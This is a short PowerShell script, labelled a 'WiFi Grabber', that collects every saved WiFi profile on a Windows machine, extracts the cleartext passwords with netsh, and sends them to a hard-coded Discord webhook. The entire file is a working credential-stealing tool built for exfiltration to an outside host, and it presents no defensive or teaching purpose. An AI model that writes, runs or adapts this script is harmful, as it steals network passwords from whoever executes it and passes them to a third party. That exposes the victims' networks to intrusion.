# WiFi Grabber Script - Collects WiFi passwords and sends them to a Discord Webhook

try {
    # Collect saved WiFi profiles
    $wifiProfiles = netsh wlan show profiles | ForEach-Object {
        ($_ -split ": ")[1].Trim()
    }

    # Initialize a variable to store WiFi credentials
    $wifiCreds = ""

    # Loop through each profile to extract the key (password)
    foreach ($profile in $wifiProfiles) {
        $details = netsh wlan show profile name="$profile" key=clear | Select-String "(SSID name|Key Content)"
        $wifiCreds += "`nProfile: $profile`n$details`n"
    }

    # Prepare Discord Webhook URL (Replace this with your webhook)
    $webhookUrl = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"

    # Prepare JSON payload for Discord
    $body = @{ content = "WiFi Credentials:`n```$wifiCreds```" } | ConvertTo-Json -Depth 10

    # Send the data to Discord
    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json'

} catch {
    # Handle errors and log them
    "Error: $($_.Exception.Message)" | Out-File -FilePath "C:\temp\wifi_error.log" -Append
}
